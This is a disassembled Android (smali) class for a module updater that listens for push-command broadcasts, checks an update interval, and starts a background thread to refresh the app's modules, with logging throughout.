.class public Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "MonolithicSchemeUpdater.java"


# static fields
.field public static final ATTRIBUTE_UPDATE_INTERVAL:Ljava/lang/String; = "update_interval"

.field public static final COMMAND_ENFORCE_UPDATE:Ljava/lang/String; = "enforce_update"

.field public static final TAG:Ljava/lang/String; = "SchemeUp"


# instance fields
.field protected commandReceiver:Lcom/hp/vd/module/custom/scheme/FcmCommandReceiver;

.field protected lastUpdate:Ljava/lang/Long;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected updateThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 22
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 31
    iput-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->commandReceiver:Lcom/hp/vd/module/custom/scheme/FcmCommandReceiver;

    .line 32
    iput-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->lastUpdate:Ljava/lang/Long;

    .line 33
    iput-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->updateThread:Ljava/lang/Thread;

    return-void
.end method


# virtual methods
.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 39
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "daemon"

    .line 41
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 42
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 43
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 44
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x4

    .line 45
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v4.0"

    .line 46
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "update_interval"

    const-string v2, "43100"

    .line 48
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 50
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "MonolithicSchemeUpdater"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired()Z
    .locals 10

    .line 162
    iget-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 164
    iget-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->lastUpdate:Ljava/lang/Long;

    .line 165
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/16 v4, 0x3e8

    div-long/2addr v2, v4

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    .line 167
    iget-object v3, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "update_interval"

    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    const-string v4, "SchemeUp"

    .line 169
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "start(): now = "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v6, ", syncInterval = "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v6, ", lastSynchronization = "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v0, v4, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    if-eqz v1, :cond_0

    .line 171
    invoke-virtual {v2}, Ljava/lang/Long;->longValue()J

    move-result-wide v4

    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v6

    sub-long v8, v4, v6

    int-to-long v3, v3

    cmp-long v1, v8, v3

    if-gez v1, :cond_0

    const-string v1, "SchemeUp"

    const-string v2, "start(): received heartbeat before the updater interval has expired."

    .line 172
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v0, 0x0

    return v0

    .line 176
    :cond_0
    iput-object v2, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->lastUpdate:Ljava/lang/Long;

    const/4 v0, 0x1

    return v0
.end method

.method public initialize()Z
    .locals 5

    .line 58
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 61
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "SchemeUp"

    .line 63
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "initialize(): persisted module data loaded, update_interval="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "update_interval"

    .line 65
    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 63
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "SchemeUp"

    const-string v3, "initialize(): cannot initialize()"

    .line 69
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 75
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->moduleData:Lcom/hp/vd/data/ModuleData;

    :goto_0
    const/4 v0, 0x1

    return v0
.end method

.method public isStarted()Z
    .locals 1

    .line 200
    iget-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->updateThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->updateThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->updateThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x1

    return v0

    :cond_0
    const/4 v0, 0x0

    return v0
.end method

.method public resetLastUpdate()V
    .locals 1

    const/4 v0, 0x0

    .line 209
    iput-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->lastUpdate:Ljava/lang/Long;

    return-void
.end method

.method public start()Z
    .locals 6

    .line 90
    iget-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "SchemeUp"

    const-string v2, "start() called."

    .line 91
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 97
    iget-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->commandReceiver:Lcom/hp/vd/module/custom/scheme/FcmCommandReceiver;

    if-nez v1, :cond_0

    .line 99
    :try_start_0
    new-instance v1, Lcom/hp/vd/module/custom/scheme/FcmCommandReceiver;

    iget-object v2, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0}, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v3

    invoke-direct {v1, p0, v2, v3}, Lcom/hp/vd/module/custom/scheme/FcmCommandReceiver;-><init>(Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->commandReceiver:Lcom/hp/vd/module/custom/scheme/FcmCommandReceiver;

    .line 100
    new-instance v1, Landroid/content/IntentFilter;

    invoke-direct {v1}, Landroid/content/IntentFilter;-><init>()V

    const-string v2, "com.hp.vb.FCM_COMMAND_RECEIVED"

    .line 102
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 104
    iget-object v2, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->commandReceiver:Lcom/hp/vd/module/custom/scheme/FcmCommandReceiver;

    invoke-virtual {v2, v3, v1}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 105
    iget-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "SchemeUp"

    const-string v3, "fcm: commandReceiver was registered in monoSchemeUpdater"

    invoke-interface {v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 108
    iget-object v2, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    const-string v3, "SchemeUp"

    const-string v4, "fcm: Exception caught while registering receiver"

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 116
    :cond_0
    :goto_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->hasUpdateIntervalExpired()Z

    move-result v1

    const/4 v2, 0x1

    if-nez v1, :cond_1

    return v2

    .line 131
    :cond_1
    :try_start_1
    iget-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->updateThread:Ljava/lang/Thread;

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->updateThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->updateThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, "SchemeUp"

    const-string v3, "start(): a update thread is already running. Skipping cycle."

    .line 132
    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2

    .line 141
    :cond_2
    new-instance v1, Lcom/hp/vd/module/custom/scheme/UpdateRunnable;

    iget-object v3, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->context:Lcom/hp/vd/context/Context;

    .line 142
    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getModuleManager()Lcom/hp/vd/agent/ModuleManager;

    move-result-object v3

    iget-object v4, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v5, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->context:Lcom/hp/vd/context/Context;

    invoke-direct {v1, v3, v4, v5, v0}, Lcom/hp/vd/module/custom/scheme/UpdateRunnable;-><init>(Lcom/hp/vd/agent/ModuleManager;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/context/Context;Lcom/hp/vd/agent/log/IWriter;)V

    .line 148
    new-instance v3, Ljava/lang/Thread;

    const-string v4, "SchemeUp-start()"

    invoke-direct {v3, v1, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v3, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->updateThread:Ljava/lang/Thread;

    .line 149
    iget-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->updateThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v1

    .line 152
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    const-string v3, "SchemeUp"

    const-string v4, "start()\'s main try-catch"

    .line 154
    invoke-interface {v0, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    return v2
.end method

.method public startOnHeartbeat()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 4

    .line 184
    iget-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->commandReceiver:Lcom/hp/vd/module/custom/scheme/FcmCommandReceiver;

    if-eqz v0, :cond_0

    .line 186
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->commandReceiver:Lcom/hp/vd/module/custom/scheme/FcmCommandReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    const/4 v0, 0x0

    .line 187
    iput-object v0, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->commandReceiver:Lcom/hp/vd/module/custom/scheme/FcmCommandReceiver;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 190
    iget-object v1, p0, Lcom/hp/vd/module/custom/MonolithicSchemeUpdater;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "SchemeUp"

    const-string v3, "fcm: Exception caught in stop()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    :goto_0
    const/4 v0, 0x1

    return v0
.end method
